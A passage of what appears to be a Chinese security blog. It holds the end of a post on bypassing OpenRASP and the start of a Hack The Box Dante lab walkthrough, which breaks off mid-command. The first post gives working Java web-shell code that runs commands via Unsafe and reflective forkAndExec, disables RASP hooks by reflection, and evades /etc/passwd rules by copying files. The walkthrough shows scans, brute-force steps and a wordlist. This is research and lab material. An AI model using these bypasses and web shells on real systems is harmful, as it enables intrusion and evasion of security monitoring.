(ClassNotFoundException e) &#123;</span><br><span class="line">            processClass = Class.forName(<span class="string">&quot;java.lang.ProcessImpl&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">processObject</span> <span class="operator">=</span> unsafe.allocateInstance(processClass);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[][] args = <span class="keyword">new</span> <span class="title class_">byte</span>[commands.length - <span class="number">1</span>][];</span><br><span class="line">        <span class="type">int</span>      <span class="variable">size</span> <span class="operator">=</span> args.length; <span class="comment">// For added NUL bytes</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; args.length; i++) &#123;</span><br><span class="line">            args[i] = commands[i + <span class="number">1</span>].getBytes();</span><br><span class="line">            size += args[i].length;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] argBlock = <span class="keyword">new</span> <span class="title class_">byte</span>[size];</span><br><span class="line">        <span class="type">int</span>    <span class="variable">i</span>        <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">byte</span>[] arg : args) &#123;</span><br><span class="line">            System.arraycopy(arg, <span class="number">0</span>, argBlock, i, arg.length);</span><br><span class="line">            i += arg.length + <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span>[] envc                 = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">1</span>];</span><br><span class="line">        <span class="type">int</span>[] std_fds              = <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;-<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>&#125;;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">launchMechanismField</span> <span class="operator">=</span> processClass.getDeclaredField(<span class="string">&quot;launchMechanism&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">helperpathField</span>      <span class="operator">=</span> processClass.getDeclaredField(<span class="string">&quot;helperpath&quot;</span>);</span><br><span class="line">        launchMechanismField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        helperpathField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">launchMechanismObject</span> <span class="operator">=</span> launchMechanismField.get(processObject);</span><br><span class="line">        <span class="type">byte</span>[] helperpathObject      = (<span class="type">byte</span>[]) helperpathField.get(processObject);</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> <span class="variable">ordinal</span> <span class="operator">=</span> (<span class="type">int</span>) launchMechanismObject.getClass().getMethod(<span class="string">&quot;ordinal&quot;</span>).invoke(launchMechanismObject);</span><br><span class="line"></span><br><span class="line">        <span class="type">Method</span> <span class="variable">forkMethod</span> <span class="operator">=</span> processClass.getDeclaredMethod(<span class="string">&quot;forkAndExec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;</span><br><span class="line">                <span class="type">int</span>.class, <span class="type">byte</span>[].class, <span class="type">byte</span>[].class, <span class="type">byte</span>[].class, <span class="type">int</span>.class,</span><br><span class="line">                <span class="type">byte</span>[].class, <span class="type">int</span>.class, <span class="type">byte</span>[].class, <span class="type">int</span>[].class, <span class="type">boolean</span>.class</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        forkMethod.setAccessible(<span class="literal">true</span>);<span class="comment">// 设置访问权限</span></span><br><span class="line">        <span class="type">byte</span>[] CString = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">if</span>(commands[<span class="number">0</span>] == <span class="literal">null</span>)&#123;</span><br><span class="line">            CString = <span class="literal">null</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">byte</span>[] bytes  = commands[<span class="number">0</span>].getBytes();</span><br><span class="line">            CString = <span class="keyword">new</span> <span class="title class_">byte</span>[bytes.length + <span class="number">1</span>];</span><br><span class="line">            System.arraycopy(bytes, <span class="number">0</span>, CString, <span class="number">0</span>, bytes.length);</span><br><span class="line">            CString[CString.length - <span class="number">1</span>] = (<span class="type">byte</span>) <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">pid</span> <span class="operator">=</span> (<span class="type">int</span>) forkMethod.invoke(processObject, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;</span><br><span class="line">                ordinal + <span class="number">1</span>, helperpathObject, CString, argBlock, args.length,</span><br><span class="line">                <span class="literal">null</span>, envc[<span class="number">0</span>], <span class="literal">null</span>, std_fds, <span class="literal">false</span></span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 初始化命令执行结果，将本地命令执行的输出流转换为程序执行结果的输出流</span></span><br><span class="line">        <span class="type">Method</span> <span class="variable">initStreamsMethod</span> <span class="operator">=</span> processClass.getDeclaredMethod(<span class="string">&quot;initStreams&quot;</span>, <span class="type">int</span>[].class);</span><br><span class="line">        initStreamsMethod.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        initStreamsMethod.invoke(processObject, std_fds);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取本地执行结果的输入流</span></span><br><span class="line">        <span class="type">Method</span> <span class="variable">getInputStreamMethod</span> <span class="operator">=</span> processClass.getMethod(<span class="string">&quot;getInputStream&quot;</span>);</span><br><span class="line">        getInputStreamMethod.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> (InputStream) getInputStreamMethod.invoke(processObject);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">int</span>                   <span class="variable">a</span>    <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">byte</span>[]                b    = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> ((a = in.read(b)) != -<span class="number">1</span>) &#123;</span><br><span class="line">            baos.write(b, <span class="number">0</span>, a);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">PrintWriter</span> <span class="variable">out</span> <span class="operator">=</span> response.getWriter();</span><br><span class="line">        out.println(baos.toString());</span><br><span class="line">    &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>之后我们再传入?cmd&#x3D;cat&amp;cmd&#x3D;&#x2F;etc&#x2F;passwd，结果如下：</p><p><a href="https://pic.imgdb.cn/item/64cfd7af1ddac507cc875daf.jpg" title="image-20230806201152184" class="gallery-item"><img src="https://pic.imgdb.cn/item/64cfd7af1ddac507cc875daf.jpg" alt="image-20230806201152184"></a></p><p>对代码部分简略解释一下吧。首先我们通过反射获取一个unsafe实例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//反射获取unsafe实例</span></span><br><span class="line"><span class="type">Field</span> <span class="variable">theUnsafeField</span> <span class="operator">=</span> Unsafe.class.getDeclaredField(<span class="string">&quot;theUnsafe&quot;</span>);</span><br><span class="line">theUnsafeField.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">Unsafe</span> <span class="variable">unsafe</span> <span class="operator">=</span> (Unsafe) theUnsafeField.get(<span class="literal">null</span>);</span><br></pre></td></tr></table></figure><p>之后又获取了UNIXProcess实例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">processClass</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    processClass = Class.forName(<span class="string">&quot;java.lang.UNIXProcess&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">    processClass = Class.forName(<span class="string">&quot;java.lang.ProcessImpl&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">Object</span> <span class="variable">processObject</span> <span class="operator">=</span> unsafe.allocateInstance(processClass);</span><br></pre></td></tr></table></figure><p>因为我们创建此UNIXProcess对象时并未 通过其构造函数来获取，因此并未执行OpenRASP的hook代码，从而完成绕过！</p><h3 id="关闭OpenRASP开关"><a href="#关闭OpenRASP开关" class="headerlink" title="关闭OpenRASP开关"></a>关闭OpenRASP开关</h3><p>在一般的RASP产品中为了避免影响产品，都会设置一个开关，在OpenRASP中也不例外。OpenRASP的开关就是com.baidu.openrasp.HookHandler的enableHook字段：</p><p><a href="https://pic.imgdb.cn/item/64cfd7be1ddac507cc877c57.jpg" title="image-20230807002521102" class="gallery-item"><img src="https://pic.imgdb.cn/item/64cfd7be1ddac507cc877c57.jpg" alt="image-20230807002521102"></a></p><p>在我们刚刚分析的hook流程中，有一个com.baidu.openrasp.HookHandler#doRealCheckWithoutRequest函数，在函数开始做了一个判断，就是判断OpenRASP的开关是否打开：</p><p><a href="https://pic.imgdb.cn/item/64cfd7ca1ddac507cc8793c4.jpg" title="image-20230807002548473" class="gallery-item"><img src="https://pic.imgdb.cn/item/64cfd7ca1ddac507cc8793c4.jpg" alt="image-20230807002548473"></a></p><p>我们可以通过反射将这个字段设为<code>new AtomicBoolean(false)</code>，即关闭这个字段：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;com.baidu.openrasp.HookHandler&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">enableHookFiled</span> <span class="operator">=</span> cls.getDeclaredField(<span class="string">&quot;enableHook&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">modifiers</span> <span class="operator">=</span> enableHookFiled.getClass().getDeclaredField(<span class="string">&quot;modifiers&quot;</span>);</span><br><span class="line">        modifiers.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        modifiers.setInt(enableHookFiled, enableHookFiled.getModifiers() &amp; ~Modifier.FINAL);</span><br><span class="line">        enableHookFiled.set(cls.newInstance(), <span class="keyword">new</span> <span class="title class_">AtomicBoolean</span>(<span class="literal">false</span>));</span><br><span class="line">    &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> Runtime.getRuntime().exec(request.getParameter(<span class="string">&quot;cmd&quot;</span>));</span><br><span class="line">    <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> process.getInputStream();</span><br><span class="line"></span><br><span class="line">    <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">    <span class="type">byte</span>[] bytes = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">2048</span>];</span><br><span class="line">    <span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> -<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> ((a=inputStream.read(bytes)) != -<span class="number">1</span>)&#123;</span><br><span class="line">        byteArrayOutputStream.write(bytes,<span class="number">0</span>,a);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">PrintWriter</span> <span class="variable">out</span> <span class="operator">=</span> response.getWriter();</span><br><span class="line">    out.println(<span class="keyword">new</span> <span class="title class_">String</span>(byteArrayOutputStream.toByteArray()));</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>之后成功bypass：</p><p><a href="https://pic.imgdb.cn/item/64cfd7d91ddac507cc87afa4.jpg" title="image-20230807002758651" class="gallery-item"><img src="https://pic.imgdb.cn/item/64cfd7d91ddac507cc87afa4.jpg" alt="image-20230807002758651"></a></p><p>那既然这个方法可行，那我们不妨找找在刚刚的hook流程中，我们还能通过反射更改哪些字段，从而中止hook流程？还记得我们之前提到的那个熔断开关吗？那个是RASP为了在CPU占比过高的情况下设置的。我们也可以通过调用以下方式手动设置熔断：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Config</span> <span class="variable">config</span> <span class="operator">=</span> Config.getConfig();</span><br><span class="line">config.setDisableHooks(<span class="string">&quot;true&quot;</span>);</span><br></pre></td></tr></table></figure><p>之后中止hook：</p><p><a href="https://pic.imgdb.cn/item/64cfd7e71ddac507cc87cd93.jpg" title="image-20230807003115746" class="gallery-item"><img src="https://pic.imgdb.cn/item/64cfd7e71ddac507cc87cd93.jpg" alt="image-20230807003115746"></a></p><p>与之类似的还有config类的cloudSwitch字段以及hookWhiteAll字段，这两个就交给读者了。</p><h3 id="cp命令绕过RASP"><a href="#cp命令绕过RASP" class="headerlink" title="cp命令绕过RASP"></a>cp命令绕过RASP</h3><p>以读取&#x2F;etc&#x2F;passwd为例，我们看一下OpenRASP的匹配规则：</p><p><a href="https://pic.imgdb.cn/item/64cfd7f51ddac507cc87ea48.jpg" title="image-20230807003535721" class="gallery-item"><img src="https://pic.imgdb.cn/item/64cfd7f51ddac507cc87ea48.jpg" alt="image-20230807003535721"></a></p><p>这里只是匹配了cat.{1,5}&#x2F;etc&#x2F;passwd，那加入我们使用cp命令将&#x2F;etc&#x2F;passwd复制到&#x2F;tmp&#x2F;passwd，然后再查看&#x2F;tmp&#x2F;passwd不就可以绕过了吗？</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?cmd=cp /etc/passwd /tmp/passwd</span><br><span class="line">?cmd=cat /tmp/passwd</span><br></pre></td></tr></table></figure><p><a href="https://pic.imgdb.cn/item/64cfd8041ddac507cc880948.jpg" title="image-20230807003646953" class="gallery-item"><img src="https://pic.imgdb.cn/item/64cfd8041ddac507cc880948.jpg" alt="image-20230807003646953"></a></p><p>同理，我们可以将某些禁止使用的命令，如&#x2F;bin&#x2F;nc、&#x2F;bin&#x2F;wget等copy到别的位置，之后再进行调用来进行bypass。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>本篇文章主要针对OpenRASP进行了启动流程的分析和Hook流程的分析，收获很大，算是RASP入门？时至今日，个人感觉RASP技术在大规模应用上仍然有比较大的困难。一方面就是令人诟病的性能原因，还有一方面要求安全人员对漏洞的原理必须深入到代码层面。因此感觉RASP技术可能就像Glassy师傅在KCon大会说得那样，不能像从前一样只是将恶意行为覆盖掉，因为恶意行为是不可穷举的，最好的解决办法就是在漏洞的入口点将攻击进行有效拦截。</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      
        <tags>
            
            <tag> security </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTB Dante Walkthrough</title>
      <link href="/2023/05/15/htb-dante/"/>
      <url>/2023/05/15/htb-dante/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近忍痛买了HTB的pro labs， 购买之后可以打任何lab，还是挺划算的。这篇文章对Dante实验室作个简单的记录，不会提供任何一台机子的flag，只是给打靶又卡住了的师傅们提供一个解题的思路。建议还是自己亲自去打才能学到更多东西。getshell、提权以及横向的其他方式，师傅们可以自行研究。</p><p>注： 写这篇文章的时候，因为网络原因，重换了几次htb的vpn server，所以可能存在前后IP不同的情况。</p><h2 id="打靶"><a href="#打靶" class="headerlink" title="打靶"></a>打靶</h2><h3 id="存活主机探测"><a href="#存活主机探测" class="headerlink" title="存活主机探测"></a>存活主机探测</h3><p>dante给的网段是10.10.110.0&#x2F;24，直接fscan扫，扫描结果：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/home/rainb0w/Desktop]</span><br><span class="line">└─# fscan -h 10.10.110.0/24                        </span><br><span class="line"></span><br><span class="line">   ___                              _    </span><br><span class="line">  / _ \     ___  ___ _ __ __ _  ___| | __ </span><br><span class="line"> / /_\/____/ __|/ __| &#x27;__/ _` |/ __| |/ /</span><br><span class="line">/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;    </span><br><span class="line">\____/     |___/\___|_|  \__,_|\___|_|\_\   </span><br><span class="line">                     fscan version: 1.8.2</span><br><span class="line">start infoscan</span><br><span class="line">(icmp) Target 10.10.110.2     is alive</span><br><span class="line">(icmp) Target 10.10.110.100   is alive</span><br><span class="line">[*] Icmp alive hosts len is: 2</span><br><span class="line">10.10.110.100:21 open</span><br><span class="line">10.10.110.100:22 open</span><br><span class="line">[*] alive ports len is: 2</span><br><span class="line">start vulscan</span><br><span class="line">[+] ftp://10.10.110.100:21:anonymous </span><br><span class="line">已完成 1/2 [-] ssh 10.10.110.100:22 root 123 ssh: handshake failed: ssh: unable to authenticate, attempted methods [none password], no supported methods remain</span><br><span class="line">已完成 1/2 [-] ssh 10.10.110.100:22 root root@111 ssh: handshake failed: ssh: unable to authenticate, attempted methods [none password], no supported methods remain</span><br><span class="line">已完成 1/2 [-] ssh 10.10.110.100:22 root 123456789 ssh: handshake failed: ssh: unable to authenticate, attempted methods [none password], no supported methods remain</span><br><span class="line">已完成 1/2 [-] ssh 10.10.110.100:22 root abc123 ssh: handshake failed: ssh: unable to authenticate, attempted methods [none password], no supported methods remain</span><br><span class="line">已完成 1/2 [-] ssh 10.10.110.100:22 root Aa123456 ssh: handshake failed: ssh: unable to authenticate, attempted methods [none password], no supported methods remain</span><br><span class="line">已完成 1/2 [-] ssh 10.10.110.100:22 root Charge123 ssh: handshake failed: ssh: unable to authenticate, attempted methods [none password], no supported methods remain</span><br><span class="line">已完成 2/2</span><br><span class="line">[*] 扫描结束,耗时: 7m8.392454575s</span><br></pre></td></tr></table></figure><h3 id="I’m-nuts-and-bolts-about-you"><a href="#I’m-nuts-and-bolts-about-you" class="headerlink" title="I’m nuts and bolts about you"></a>I’m nuts and bolts about you</h3><p>可以看到10.10.110.100这台机子可以匿名访问：</p><p><a href="https://pic.imgdb.cn/item/6461c8ba0d2dde5777ae9d48.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/6461c8ba0d2dde5777ae9d48.jpg"></a></p><p>下载之后，有一个todo.txt，这是它的内容：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">- Finalize WordPress permission changes - PENDING</span><br><span class="line">- Update links to to utilize DNS Name prior to changing to port 80 - PENDING</span><br><span class="line">- Remove LFI vuln from the other site - PENDING</span><br><span class="line">- Reset James&#x27; password to something more secure - PENDING</span><br><span class="line">- Harden the system prior to the Junior Pen Tester assessment - IN PROGRESS</span><br></pre></td></tr></table></figure><p>有以下几点提示需要注意：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">一个部署着wordpress的站点，用户的权限需要更改</span><br><span class="line">别的站点存在LFI漏洞</span><br><span class="line">james的密码可能容易被爆破出来</span><br></pre></td></tr></table></figure><p>之后我们用nmap扫一下10.10.110.100：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/home/rainb0w/Desktop]</span><br><span class="line">└─# nmap -sS -sV -sC -A -p- --min-rate 5000 10.10.110.100  </span><br><span class="line">Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-12 04:08 EDT</span><br><span class="line">Nmap scan report for 10.10.110.100</span><br><span class="line">Host is up (0.31s latency).</span><br><span class="line">Not shown: 65532 filtered tcp ports (no-response)</span><br><span class="line">PORT      STATE SERVICE VERSION</span><br><span class="line">21/tcp    open  ftp     vsftpd 3.0.3</span><br><span class="line">| ftp-syst: </span><br><span class="line">|   STAT: </span><br><span class="line">| FTP server status:</span><br><span class="line">|      Connected to ::ffff:10.10.14.6</span><br><span class="line">|      Logged in as ftp</span><br><span class="line">|      TYPE: ASCII</span><br><span class="line">|      No session bandwidth limit</span><br><span class="line">|      Session timeout in seconds is 300</span><br><span class="line">|      Control connection is plain text</span><br><span class="line">|      Data connections will be plain text</span><br><span class="line">|      At session startup, client count was 2</span><br><span class="line">|      vsFTPd 3.0.3 - secure, fast, stable</span><br><span class="line">|_End of status</span><br><span class="line">| ftp-anon: Anonymous FTP login allowed (FTP code 230)</span><br><span class="line">|_Can&#x27;t get directory listing: PASV IP 172.16.1.100 is not the same as 10.10.110.100</span><br><span class="line">22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   3072 8fa2ffcf4e3eaa2bc26ff45a2ad9e9da (RSA)</span><br><span class="line">|   256 07838eb6f7e672e965db42fdedd693ee (ECDSA)</span><br><span class="line">|_  256 1345c5cadba6b4ae9c097d21cd9d74f4 (ED25519)</span><br><span class="line">65000/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))</span><br><span class="line">| http-robots.txt: 2 disallowed entries </span><br><span class="line">|_/wordpress DANTE&#123;fake_flag&#125;</span><br><span class="line">|_http-server-header: Apache/2.4.41 (Ubuntu)</span><br><span class="line">|_http-title: Apache2 Ubuntu Default Page: It works</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running (JUST GUESSING): Linux 4.X|5.X (85%)</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5</span><br><span class="line">Aggressive OS guesses: Linux 4.15 - 5.6 (85%), Linux 5.0 (85%)</span><br><span class="line">No exact OS matches for host (test conditions non-ideal).</span><br><span class="line">Network Distance: 2 hops</span><br><span class="line">Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE (using port 21/tcp)</span><br><span class="line">HOP RTT       ADDRESS</span><br><span class="line">1   ...</span><br><span class="line">2   422.66 ms 10.10.110.100</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 72.58 seconds</span><br></pre></td></tr></table></figure><p>发现还有一个65000的端口被开放，并且还存在一个&#x2F;wordpress目录，还有一个robots.txt，进入拿到flag：</p><p><a href="https://pic.imgdb.cn/item/6462afda0d2dde57771169b2.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/6462afda0d2dde57771169b2.jpg"></a></p><h3 id="It’s-easier-this-way"><a href="#It’s-easier-this-way" class="headerlink" title="It’s easier this way"></a>It’s easier this way</h3><p>既然存在一个部署了wordpress，那就用wpscan扫一下吧：</p><p><a href="https://pic.imgdb.cn/item/6461cefc0d2dde5777b62b0c.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/6461cefc0d2dde5777b62b0c.jpg"></a></p><p>观察扫描结果，可以看到扫出来了两个用户名，admin和james。回想刚刚的提示，我们可以尝试去爆破一下james的密码。但是密码太多了，为了节约时间先用cewl来给我们生成个字典：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">──(root㉿kali)-[/home/rainb0w/Desktop]</span><br><span class="line">└─# cewl http://10.10.110.100:65000/wordpress -w password.txt</span><br><span class="line">CeWL 5.5.2 (Grouping) Robin Wood (robin@digi.ninja) (https://digi.ninja/)</span><br></pre></td></tr></table></figure><p>之后用wpscan来爆破密码，结果为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url 